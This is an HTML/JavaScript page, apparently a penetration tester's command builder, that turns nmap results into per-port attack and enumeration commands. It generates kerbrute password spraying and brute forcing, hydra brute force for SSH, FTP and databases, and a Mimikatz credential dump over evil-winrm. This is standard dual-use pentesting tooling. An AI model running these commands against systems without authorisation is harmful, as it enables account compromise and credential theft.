<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Kuhl's Pentest Command Builder</title>
<style>
  :root { color-scheme: light dark; }
  body { font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif; margin: 14px; line-height: 1.25; font-size: 0.78rem; }
  h1 { font-size: 0.95rem; margin: 0 0 10px; }
  fieldset { border: 1px solid #8884; border-radius: 8px; padding: 8px; margin: 0 0 12px; }
  legend { padding: 0 4px; opacity: 0.85; font-size: 0.78rem; }
  .top-row { display: flex; gap: 6px; flex-wrap: wrap; margin-bottom: 6px; }
  .top-row input, .top-row textarea { flex: 1; min-width: 140px; }
  input[type="text"], input[type="password"], textarea { width: 100%; padding: 5px 8px; border: 1px solid #8884; border-radius: 6px; font-size: 0.78rem; }
  textarea { min-height: 110px; resize: vertical; }
  .ports { display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap: 4px 6px; max-height: 320px; overflow: auto; padding: 6px; border: 1px solid #8884; border-radius: 8px; }
  label.chk { display: flex; align-items: center; gap: 6px; font-size: 0.72rem; }
  .actions { display: flex; gap: 6px; flex-wrap: wrap; margin-top: 6px; align-items: center; }
  button { border: 0; padding: 6px 10px; border-radius: 6px; cursor: pointer; font-weight: 600; background: #4f46e5; color: #fff; font-size: 0.72rem; }
  button.secondary { background: #0ea5e9; }
  button.ghost { background: #eee; color: #111; }
  pre { background: #111; color: #f5f5f5; padding: 6px; border-radius: 6px; overflow: auto; font-size: 0.72rem; max-height: 460px; }
  .hint { font-size: 0.68rem; opacity: 0.75; }
  .links { display: grid; grid-template-columns: 1fr; gap: 6px; max-height: 220px; overflow: auto; padding: 6px; border: 1px solid #8884; border-radius: 8px; }
  .links a { text-decoration: none; padding: 6px; border: 1px dashed #8884; border-radius: 6px; display: block; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
  .links a:hover { background: #8881; }

  .kb-asterisk { display: inline-block; font-weight: 700; opacity: .55; margin-left: 4px; cursor: pointer; user-select: none; line-height: 1; }
  .kb-asterisk:hover { opacity: 1; text-shadow: 0 0 0.25px currentColor; }
  .kb-asterisk:focus { outline: none; box-shadow: 0 0 0 2px #60a5fa66; border-radius: 3px; }

  .overlay { position: fixed; inset: 0; background: rgba(0,0,0,.45); display: none; align-items: center; justify-content: center; z-index: 9999; }
  .panel { width: min(820px, 92vw); max-height: 82vh; background: #0b0b0b; color: #eaeaea; border-radius: 12px; padding: 0; box-shadow: none; display: flex; flex-direction: column; }
  .panel header { display: flex; align-items: center; justify-content: space-between; padding: 10px 12px; font-size: 0.8rem; }
  .panel header .title { opacity: .9; }
  .panel header .close { background: transparent; color: #eaeaea; border: 0; font-size: 1rem; padding: 4px 8px; cursor: pointer; }
  .panel pre { margin: 0; border-radius: 0 0 12px 12px; padding: 10px 12px; background: #0b0b0b; color: #dcdcdc; }
</style>
</head>
<body>
  <h1>Kuhl's Pentest Command Builder</h1>

  <fieldset>
    <legend>Target Info</legend>
    <div class="top-row">
      <input id="ip" type="text" placeholder="IP / Host" />
      <input id="user" type="text" placeholder="Username (optional)" />
      <input id="pass" type="password" placeholder="Password (optional)" />
      <input id="domain" type="text" placeholder="Domain/Realm (optional)" />
    </div>
  </fieldset>

  <fieldset>
    <legend>Nmap Results</legend>
    <div class="top-row">
      <textarea id="nmapInput" placeholder="Paste nmap normal output here"></textarea>
    </div>
    <div class="actions">
      <button type="button" class="ghost" id="parseNmap">Parse Nmap</button>
      <label><input type="checkbox" id="includeFiltered" checked> Include filtered ports when selecting</label>
      <button type="button" class="ghost" id="clearLinks">Clear links</button>
      <button type="button" class="ghost" id="clearPorts">Clear ports</button>

      <!-- NEW: Nmap mode + pass-creds -->
      <label style="margin-left:8px;">Nmap mode:
        <select id="nmapMode">
          <option value="off">Off</option>
          <option value="default">Default (-sC)</option>
          <option value="bundles" selected>Service bundles (smart)</option>
          <option value="vuln">Vuln category</option>
          <option value="vulners">Vulners</option>
          <option value="vulscan">Vulscan</option>
        </select>
      </label>
      <label><input type="checkbox" id="nmapPassCreds" checked> Pass creds to NSE</label>
    </div>
  </fieldset>

  <fieldset>
    <legend>Search links (open ports)</legend>
    <div id="portLinks" class="links"></div>
  </fieldset>

  <fieldset>
    <legend>Ports</legend>
    <div class="ports" id="ports"></div>
    <div class="actions">
      <button type="button" class="ghost" id="selectCommon">Select common</button>
      <button type="button" class="ghost" id="selectAll">Select all</button>
      <button type="button" class="ghost" id="clearAll">Clear</button>
    </div>
  </fieldset>

  <div class="actions">
    <button id="build">Build commands</button>
    <button id="copy" class="secondary">Copy all</button>
  </div>

  <pre id="out"># Commands will appear here…</pre>

  <!-- Kerbrute overlay -->
  <div id="kbOverlay" class="overlay" aria-hidden="true">
    <div class="panel" role="dialog" aria-modal="true" aria-labelledby="kbTitle">
      <header>
        <div id="kbTitle" class="title">Kerbrute install (Kali)</div>
        <button class="close" id="kbClose" title="Close">✕</button>
      </header>
      <pre id="kbPre"></pre>
    </div>
  </div>

<script>
document.addEventListener('DOMContentLoaded', () => {
  const PORTS = [
    [21,'FTP'], [22,'SSH'], [23,'Telnet'],
    [25,'SMTP'], [53,'DNS'], [80,'HTTP'],
    [88,'Kerberos'],
    [110,'POP3'], [111,'RPCbind'],
    [135,'MSRPC'], [139,'SMB'], [143,'IMAP'],
    [161,'SNMP'], [389,'LDAP'], [443,'HTTPS'], [445,'SMB'],
    [465,'SMTPS'], [587,'SMTP-Sub'], [636,'LDAPS'],
    [993,'IMAPS'], [995,'POP3S'],
    [1433,'MSSQL'], [1521,'Oracle'],
    [1900,'SSDP (UDP)'], [2049,'NFS'], [2375,'Docker API'],
    [3000,'Dev web'], [3306,'MySQL'],
    [3389,'RDP'], [5000,'Web/Flask'],
    [5431,'UPnP'], [5432,'Postgres'], [5601,'Kibana'],
    [5900,'VNC'], [5985,'WinRM'], [5986,'WinRM(S)'],
    [6379,'Redis'], [8000,'HTTP-alt'], [8080,'HTTP-alt'], [8081,'HTTP-alt'],
    [8443,'HTTPS-alt'], [9000,'Dev svc'], [9200,'Elastic']
  ];

  const portsEl  = document.getElementById('ports');
  const ipEl     = document.getElementById('ip');
  const userEl   = document.getElementById('user');
  const passEl   = document.getElementById('pass');
  const domainEl = document.getElementById('domain');
  const outEl    = document.getElementById('out');
  const nmapEl   = document.getElementById('nmapInput');
  const linksEl  = document.getElementById('portLinks');
  const includeFilteredEl = document.getElementById('includeFiltered');
  const nmapModeEl = document.getElementById('nmapMode');
  const nmapPassCredsEl = document.getElementById('nmapPassCreds');

  // Build checkbox grid (+ * trigger for 88 Kerberos)
  PORTS.forEach(([p,label])=> ensurePortCheckbox(p, label));
  function ensurePortCheckbox(port, label='(parsed)'){
    const id = 'p' + port;
    if(document.getElementById(id)) return;
    const wrap = document.createElement('label');
    wrap.className = 'chk';
    wrap.setAttribute('for', id);
    let inner = `<input id="${id}" type="checkbox" value="${port}"><span>${port} <span class="hint">${label}</span></span>`;
    if(port === 88){
      inner += ` <span class="kb-asterisk" title="Kerbrute install (Kali)" role="button" tabindex="0" data-kb-asterisk>*</span>`;
    }
    wrap.innerHTML = inner;
    portsEl.appendChild(wrap);
    if(port === 88){
      const star = wrap.querySelector('[data-kb-asterisk]');
      const open = () => openKerbruteWindow();
      star.addEventListener('click', open);
      star.addEventListener('keydown', (e)=>{ if(e.key==='Enter'||e.key===' '){ e.preventDefault(); open(); } });
    }
  }

  // Helpers
  function shellEscape(s){
    if(s===undefined || s===null) return '';
    if(s === '') return "''";
    return `'${String(s).replace(/'/g,"'\\''")}'`;
  }
  const join = parts => parts.filter(Boolean).join(' ');
  function getSelectedPorts(){
    const set = new Set();
    portsEl.querySelectorAll('input[type=checkbox]:checked').forEach(cb=> set.add(parseInt(cb.value,10)));
    return [...set].sort((a,b)=>a-b);
  }
  function clearPorts(){ portsEl.querySelectorAll('input[type=checkbox]').forEach(cb=> cb.checked = false); }
  function clearLinks(){ linksEl.innerHTML = ''; }

  document.getElementById('selectCommon').addEventListener('click', ()=>{
    const commons = new Set([21,22,23,25,53,80,88,139,143,389,443,445,1433,3306,3389,5432,5985,5986,6379,8080,8443]);
    portsEl.querySelectorAll('input[type=checkbox]').forEach(cb=> cb.checked = commons.has(parseInt(cb.value,10)));
  });
  document.getElementById('selectAll').addEventListener('click', ()=>{
    portsEl.querySelectorAll('input[type=checkbox]').forEach(cb=> cb.checked = true);
  });
  document.getElementById('clearAll').addEventListener('click', clearPorts);
  document.getElementById('clearPorts').addEventListener('click', clearPorts);
  document.getElementById('clearLinks').addEventListener('click', clearLinks);

  // Parse Nmap (select ports + links, and we can infer if -sV was used)
  document.getElementById('parseNmap').addEventListener('click', ()=>{
    const txt = nmapEl.value || '';
    if(!txt.trim()) return;

    const ipMatch = txt.match(/Nmap scan report for .*?\((\d{1,3}(?:\.\d{1,3}){3})\)/) ||
                    txt.match(/Nmap scan report for\s+(\d{1,3}(?:\.\d{1,3}){3})/);
    if(ipMatch) ipEl.value = ipMatch[1] || ipMatch[0].split('for').pop().trim();

    const includeFiltered = includeFilteredEl.checked;
    const openLineRe = /^\s*(\d{1,5})\/(tcp|udp)\s+open(?:\S*)\s+.*$/gmi;
    const filteredLineRe = /^\s*(\d{1,5})\/(tcp|udp)\s+filtered\s+.*$/gmi;

    clearLinks();
    const toSelect = new Set();

    let m;
    while((m = openLineRe.exec(txt)) !== null){
      const fullLine = m[0].trim();
      const portNum = parseInt(m[1], 10);
      if(!isNaN(portNum)){
        ensurePortCheckbox(portNum);
        toSelect.add(portNum);
        const a = document.createElement('a');
        a.href = 'https://www.google.com/search?q=' + encodeURIComponent(fullLine);
        a.target = '_blank'; a.rel = 'noopener'; a.textContent = fullLine;
        linksEl.appendChild(a);
      }
    }

    if(includeFiltered){
      let f;
      while((f = filteredLineRe.exec(txt)) !== null){
        const portNum = parseInt(f[1], 10);
        if(!isNaN(portNum)){ ensurePortCheckbox(portNum); toSelect.add(portNum); }
      }
    }

    portsEl.querySelectorAll('input[type=checkbox]').forEach(cb=>{
      const val = parseInt(cb.value,10);
      cb.checked = toSelect.has(val);
    });
  });

  // Build commands
  document.getElementById('build').addEventListener('click', ()=>{
    const host   = ipEl.value.trim();
    const user   = userEl.value.trim();
    const pass   = passEl.value;
    const domain = domainEl.value.trim();
    const ports  = getSelectedPorts();

    if(!host){ outEl.textContent = '# Please enter an IP/host.'; return; }
    if(!ports.length){ outEl.textContent = '# Please select at least one port.'; return; }

    const cmds = [];

    const cme = (proto) => {
      const parts = ['crackmapexec', proto, host];
      if(user)   { parts.push('-u', shellEscape(user)); }
      if(pass)   { parts.push('-p', shellEscape(pass)); }
      if(domain) { parts.push('-d', shellEscape(domain)); }
      cmds.push(join(parts));
    };

    // ---------- Kerberos (88) / Kerbrute ----------
    if(ports.includes(88)){
      cmds.push('# Kerberos (88) — Kerbrute');
      if(!domain){
        cmds.push('# NOTE: Provide Domain/Realm to enable Kerbrute (-d).');
      } else {
        cmds.push(`kerbrute userenum -d ${shellEscape(domain)} --dc ${host} users.txt`);
        if(pass){ cmds.push(`kerbrute passwordspray -d ${shellEscape(domain)} --dc ${host} users.txt ${shellEscape(pass)}`); }
        else { cmds.push(`# passwordspray example`); cmds.push(`kerbrute passwordspray -d ${shellEscape(domain)} --dc ${host} users.txt 'Password123!'`); }
        if(user){ cmds.push(`kerbrute bruteuser -d ${shellEscape(domain)} --dc ${host} ${shellEscape(user)} passwords.txt`); }
        cmds.push(`kerbrute bruteforce -d ${shellEscape(domain)} --dc ${host} combos.txt`);
        cmds.push(`# (optional) throttle to avoid lockouts`);
        cmds.push(`kerbrute passwordspray -d ${shellEscape(domain)} --dc ${host} -t 2 -delay 1500 users.txt 'Season2025!'`);
      }
    }

    // ---------- SMB (139/445) ----------
    if(ports.some(p=>p===139||p===445)){
      cmds.push('# SMB');
      // enum4linux-ng: -w for domain; HOST last
      const e4l = ['enum4linux-ng','-A'];
      if(user)   e4l.push('-u', shellEscape(user));
      if(pass)   e4l.push('-p', shellEscape(pass));
      if(domain) e4l.push('-w', shellEscape(domain));
      e4l.push(host);
      cmds.push(join(e4l));

      const smbm = ['smbmap','-H',host];
      if(user)   smbm.push('-u', shellEscape(user));
      if(pass)   smbm.push('-p', shellEscape(pass));
      if(domain) smbm.push('-d', shellEscape(domain));
      cmds.push(join(smbm));

      cmds.push(`smbclient -L \\\\${host} -N`);
      cme('smb');
    }

    // ---------- WinRM (5985/5986) ----------
    if(ports.some(p=>p===5985||p===5986)){
      cmds.push('# WinRM');
      const ew = ['evil-winrm'];
      if(user) ew.push('-u', shellEscape(user));
      if(pass) ew.push('-p', shellEscape(pass));
      ew.push('-i', host);
      cmds.push(join(ew));
      if(user && pass){
        cmds.push('# Mimikatz via WinRM (requires Invoke-Mimikatz.ps1 locally)');
        cmds.push(`evil-winrm -u ${shellEscape(user)} -p ${shellEscape(pass)} -i ${host} -s .`);
        cmds.push('# Inside evil-winrm session:');
        cmds.push('upload Invoke-Mimikatz.ps1');
        cmds.push('powershell -ep bypass -c "Import-Module .\\\\Invoke-Mimikatz.ps1; Invoke-Mimikatz -Command \\"sekurlsa::logonpasswords\\""');
      }
      cme('winrm');
    }

    // ---------- DNS (53) ----------
    if(ports.includes(53)){
      cmds.push('# DNS');
      cmds.push(`dig @${host} any .`);
      cmds.push(`dig @${host} -x ${host}`);
      cmds.push(`dnsenum ${host}`);
    }

    // ---------- LDAP / LDAPS (389/636) ----------
    if(ports.some(p=>p===389||p===636)){
      const scheme = ports.includes(636) ? 'ldaps' : 'ldap';
      cmds.push('# LDAP');
      if(user && pass){
        cmds.push(`ldapsearch -x -H ${scheme}://${host} -D ${shellEscape(user)} -w ${shellEscape(pass)} -b "" -s base "(objectClass=*)"`);
      } else {
        cmds.push(`ldapsearch -x -H ${scheme}://${host} -b "" -s base "(objectClass=*)"`);
      }
      cme('ldap');
    }

    // ---------- SSH (22) ----------
    if(ports.includes(22)){
      cmds.push('# SSH');
      if(user){
        cmds.push(`ssh ${shellEscape(user)}@${host}`);
        if(pass){ cmds.push(`sshpass -p ${shellEscape(pass)} ssh ${shellEscape(user)}@${host}`); }
      } else {
        cmds.push(`ssh ${host}`);
      }
      const uOnly = user ? `-l ${shellEscape(user)}` : '-L users.txt';
      const pOnly = pass ? `-p ${shellEscape(pass)}` : '-P passwords.txt';
      cmds.push(`hydra -t 4 ${uOnly} ${pOnly} ssh://${host}`);
      cme('ssh');
    }

    // ---------- FTP (21) ----------
    if(ports.includes(21)){
      cmds.push('# FTP');
      if(user && pass){
        cmds.push(`lftp -u ${shellEscape(user)},${shellEscape(pass)} ${host}`);
        cmds.push(`curl -v -u ${shellEscape(user+':'+pass)} ftp://${host}/`);
      } else if(user && !pass){
        cmds.push(`lftp -u ${shellEscape(user)} ${host}`);
        cmds.push(`ftp ${host}`);
      } else {
        cmds.push(`ftp ${host}`);
      }
      const uOnly = user ? `-l ${shellEscape(user)}` : '-L users.txt';
      const pOnly = pass ? `-p ${shellEscape(pass)}` : '-P passwords.txt';
      cmds.push(`hydra -t 4 ${uOnly} ${pOnly} ftp://${host}`);
      cme('ftp');
    }

    // ---------- MSSQL (1433) ----------
    if(ports.includes(1433)){
      cmds.push('# MSSQL');
      const u = user || 'user', pw = pass || 'password', dom = domain ? (domain + '/') : '';
      cmds.push(`mssqlclient.py ${dom}${u}:${pw}@${host} -windows-auth`);
      cme('mssql');
    }

    // ---------- RDP (3389) ----------
    if(ports.includes(3389)){
      cmds.push('# RDP');
      const u = user ? `/u:${user}` : '/u:USER';
      const p = pass ? `/p:${pass}` : '/p:PASSWORD';
      const d = domain ? `/d:${domain}` : '';
      cmds.push(`xfreerdp /v:${host} ${u} ${p} ${d} /cert:ignore`.replace(/\s+/g,' ').trim());
      cme('rdp');
    }

    // ---------- Postgres (5432) ----------
    if(ports.includes(5432)){
      cmds.push('# Postgres');
      if(user && pass){
        cmds.push(`psql "postgresql://${encodeURIComponent(user)}:${encodeURIComponent(pass)}@${host}:5432/postgres"`);
      } else {
        const uOnly = user ? `-l ${shellEscape(user)}` : '-L users.txt';
        const pOnly = pass ? `-p ${shellEscape(pass)}` : '-P passwords.txt';
        cmds.push(`hydra -t 4 ${uOnly} ${pOnly} -s 5432 postgres://${host}`);
      }
    }

    // ---------- MySQL (3306) ----------
    if(ports.includes(3306)){
      cmds.push('# MySQL');
      if(user && pass){
        cmds.push(`mysql -h ${host} -P 3306 -u ${shellEscape(user)} -p`);
      } else {
        const uOnly = user ? `-l ${shellEscape(user)}` : '-L users.txt';
        const pOnly = pass ? `-p ${shellEscape(pass)}` : '-P passwords.txt';
        cmds.push(`hydra -t 4 ${uOnly} ${pOnly} -s 3306 mysql://${host}`);
      }
    }

    // ---------- UPnP (5431) ----------
    if(ports.includes(5431)){
      cmds.push('# UPnP (5431/tcp)');
      cmds.push(`nmap --script upnp-info ${host}`);
      cmds.push(`curl -s http://${host}:5431/setup.xml`);
      cmds.push(`curl -s http://${host}:5431/rootDesc.xml`);
    }

    // ---------- SSDP (1900/udp) ----------
    if(ports.includes(1900)){
      cmds.push('# SSDP (1900/udp)');
      cmds.push(`nmap -sU -p 1900 --script broadcast-upnp-info ${host}`);
    }

    // ---------- Redis (6379) ----------
    if(ports.includes(6379)){
      cmds.push('# Redis');
      const a = pass ? `-a ${shellEscape(pass)}` : '';
      cmds.push(`redis-cli -h ${host} -p 6379 ${a}`.replace(/\s+/g,' ').trim());
    }

    // ---------- Oracle (1521) ----------
    if(ports.includes(1521)){
      const uo = user || 'scott', pwo = pass || 'tiger';
      cmds.push('# Oracle');
      cmds.push(`sqlplus ${uo}/${pwo}@${host}:1521/ORCL`);
    }

    // ---------- Elasticsearch (9200) ----------
    if(ports.includes(9200)){
      cmds.push('# Elasticsearch');
      cmds.push(`curl -s http://${host}:9200/`);
      cmds.push(`curl -s http://${host}:9200/_cat/indices?v`);
    }

    // ---------- Docker Remote API (2375) ----------
    if(ports.includes(2375)){
      cmds.push('# Docker (remote API)');
      cmds.push(`curl -s http://${host}:2375/version`);
      cmds.push(`curl -s http://${host}:2375/containers/json`);
      cmds.push(`docker -H tcp://${host}:2375 version`);
    }

    // ---------- NFS (2049) ----------
    if(ports.includes(2049)){
      cmds.push('# NFS');
      cmds.push(`showmount -e ${host}`);
    }

    // ---------- SNMP (161) ----------
    if(ports.includes(161)){
      cmds.push('# SNMP');
      cmds.push(`onesixtyone -c community.txt ${host}`);
      cmds.push(`snmpwalk -v2c -c public ${host} 1.3.6.1.2.1.1`);
      cmds.push(`snmp-check ${host}`);
    }

    // ---------- Nmap mode ----------
    const nmapTxt = (nmapEl.value || '');
    const hasVersion = /^PORT\s+STATE\s+SERVICE\s+VERSION/im.test(nmapTxt) || /Service Info:/i.test(nmapTxt);
    const mode = nmapModeEl.value;
    const passCreds = nmapPassCredsEl.checked;

    function emitDefault(){
      cmds.push('# Nmap (default scripts)');
      cmds.push(`sudo nmap -Pn -sC -sV -p ${ports.join(',')} ${host}`);
    }
    function emitVuln(){
      cmds.push('# Nmap (vuln category)');
      cmds.push(`sudo nmap -Pn -sV -p ${ports.join(',')} ${host} --script vuln --script-timeout 20s`);
    }
    function emitVulners(){
      if(!hasVersion) return; // require visible -sV results pasted
      cmds.push('# Nmap (vulners)');
      cmds.push(`sudo nmap -Pn -sV -p ${ports.join(',')} ${host} --script vulners --script-args mincvss=7.0`);
    }
    function emitVulscan(){
      if(!hasVersion) return; // best with -sV-visible results
      cmds.push('# Nmap (vulscan)');
      cmds.push(`sudo nmap -Pn -sV -p ${ports.join(',')} ${host} --script vulscan`);
    }
    function emitBundles(){
      if(!hasVersion) return; // respect your rule: no bundles without -sV pasted
      const sel = new Set(ports);
      const smbPorts = [139,445].filter(p=>sel.has(p));
      const httpPorts = [80,443,8080,8081,8000,8443,3000,5000,5601,9000].filter(p=>sel.has(p));
      const ldapPorts = [389,636].filter(p=>sel.has(p));
      const tlsPorts = [443,8443,636,5986,3269,3389].filter(p=>sel.has(p));

      if (smbPorts.length){
        const scripts = 'smb2-security-mode,smb2-time,smb-os-discovery,smb-enum-shares,smb-enum-users';
        const args = [];
        if (passCreds && user) args.push(`smbusername=${shellEscape(user)}`);
        if (passCreds && pass) args.push(`smbpassword=${shellEscape(pass)}`);
        if (passCreds && domain) args.push(`smbdomain=${shellEscape(domain)}`);
        cmds.push(`sudo nmap -Pn -sV -p ${smbPorts.join(',')} ${host} --script "${scripts}"${args.length ? ' --script-args ' + args.join(',') : ''}`);
      }
      if (httpPorts.length){
        const scripts = 'http-title,http-server-header,http-headers,http-methods,http-enum,http-robots.txt';
        cmds.push(`sudo nmap -Pn -sV -p ${httpPorts.join(',')} ${host} --script "${scripts}"`);
      }
      if (sel.has(3389)){
        cmds.push(`sudo nmap -Pn -sV -p 3389 ${host} --script "rdp-ntlm-info,rdp-enum-encryption"`);
      }
      if (ldapPorts.length){
        cmds.push(`sudo nmap -Pn -sV -p ${ldapPorts.join(',')} ${host} --script "ldap-rootdse,ldap-search"`);
      }
      if (sel.has(53)){
        cmds.push(`sudo nmap -Pn -sV -p 53 ${host} --script "dns-recursion,dns-nsid,dns-zone-transfer"`);
      }
      if (tlsPorts.length){
        cmds.push(`sudo nmap -Pn -sV -p ${tlsPorts.join(',')} ${host} --script "ssl-cert,ssl-enum-ciphers"`);
      }
    }

    switch(mode){
      case 'default': emitDefault(); break;
      case 'vuln': emitVuln(); break;
      case 'vulners': emitVulners(); break;
      case 'vulscan': emitVulscan(); break;
      case 'bundles': emitBundles(); break;
      case 'off':
      default: /* no nmap lines */ break;
    }

    outEl.textContent = cmds.join('\n');
  });

  document.getElementById('copy').addEventListener('click', async ()=>{
    try { await navigator.clipboard.writeText(outEl.textContent); } catch {}
  });

  // Kerbrute overlay bits
  const kbOverlay = document.getElementById('kbOverlay');
  const kbPre = document.getElementById('kbPre');
  const kbClose = document.getElementById('kbClose');
  function openKerbruteWindow(){
    const lines = [
      '# Kerbrute install (Kali)',
      'sudo apt update && sudo apt install -y golang git curl',
      '',
      '# Option A: Build from source',
      'git clone https://github.com/ropnop/kerbrute.git',
      'cd kerbrute && go build -o kerbrute . && sudo mv kerbrute /usr/local/bin/ && cd .. && rm -rf kerbrute',
      'kerbrute -h',
      '',
      '# Option B: Precompiled binary (amd64)',
      'curl -L -o kerbrute_linux_amd64 https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64',
      'chmod +x kerbrute_linux_amd64 && sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute',
      'kerbrute -h'
    ];
    kbPre.textContent = lines.join('\n');
    kbOverlay.style.display = 'flex';
    kbOverlay.setAttribute('aria-hidden','false');
  }
  document.addEventListener('click', (e)=>{ if(e.target && e.target.matches('.kb-asterisk')) openKerbruteWindow(); });
  kbClose.addEventListener('click', ()=>{ kbOverlay.style.display = 'none'; kbOverlay.setAttribute('aria-hidden','true'); });
  kbOverlay.addEventListener('click', (e)=>{ if(e.target === kbOverlay){ kbOverlay.style.display = 'none'; kbOverlay.setAttribute('aria-hidden','true'); } });
  document.addEventListener('keydown', (e)=>{ if(e.key==='Escape'&&kbOverlay.style.display==='flex'){ kbOverlay.style.display='none'; kbOverlay.setAttribute('aria-hidden','true'); }});
});
</script>
</body>
</html>
